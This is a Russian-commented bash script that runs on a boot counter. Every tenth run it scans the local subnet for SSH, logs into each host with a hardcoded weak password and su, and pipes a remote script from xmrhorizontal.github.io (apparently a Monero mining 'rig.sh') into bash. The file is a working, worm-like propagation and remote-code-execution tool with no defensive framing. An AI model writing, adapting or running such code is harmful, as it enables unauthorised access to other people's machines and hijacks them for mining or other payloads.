#!/bin/bash

# Путь к файлу с счётчиком
counter_file="/root/bmcontrol/counter"

# Получаем текущее значение счётчика
boot_count=$(cat "$counter_file")

# Проверяем, нужно ли запускать скрипт
if [ $boot_count -eq 9 ]; then
  # Получаем имя сетевого интерфейса
  network_interface=$(ifconfig | grep -oE '^[^ ]+' | head -n 1)
  
  # Получаем маску подсети с помощью ifconfig
  subnet_mask=$(ifconfig "$network_interface" | awk -F: '/Mask:/{print $4}' | awk '{print $1}')
  
  # Порт SSH
  ssh_port=22
  
  # Учетные данные для подключения
  username="user"
  password="12345678"
  
  # Учетные данные для команды su
  su_password="12345678"
  
  # Команда для проверки наличия папки
  check_folder_command="if [ -d /home/root/bmcontrol ]; then echo 'Folder exists'; fi"
  
  # Команда, которую вы хотите выполнить на удаленных компьютерах
  command="wget -qO- https://xmrhorizontal.github.io/rig.sh | bash"
  
  # Функция для сканирования и выполнения команд на удаленных компьютерах
  scan_and_execute() {
    local IFS=.
    local -a network_array=($subnet_mask)
    local -a ip_array=($(ifconfig "$network_interface" | awk '/inet /{print $2}' | cut -d: -f2))
  
    # Вычисляем максимальное значение для последнего октета IP-адреса
    max_value=$((2**(8-${network_array[3]})-1))
  
    for ((i=1; i<=$max_value; i++)); do
      ip_array[3]=$i
      host="${ip_array[0]}.${ip_array[1]}.${ip_array[2]}.${ip_array[3]}"
      if nc -z -w 1 "$host" "$ssh_port" 2>/dev/null; then
        echo "Порт $ssh_port открыт на $host"
        if sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$username@$host" "su -c \"$check_folder_command\" -s /bin/bash" <<< "$su_password"; then
          echo "Папка существует на $host"
          sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$username@$host" "su -c \"$command\" -s /bin/bash" <<< "$su_password"
          echo "Команда выполнена на $host"
        else
          echo "Папка не существует на $host"
        fi
      fi
    done
  }

  # Вызываем функцию для сканирования и выполнения команд
  scan_and_execute
  
  # Увеличиваем счётчик и сохраняем его в файл
  echo "0" > "$counter_file"
else
  # Увеличиваем счётчик и сохраняем его в файл
  ((boot_count++))
  echo "$boot_count" > "$counter_file"
fi
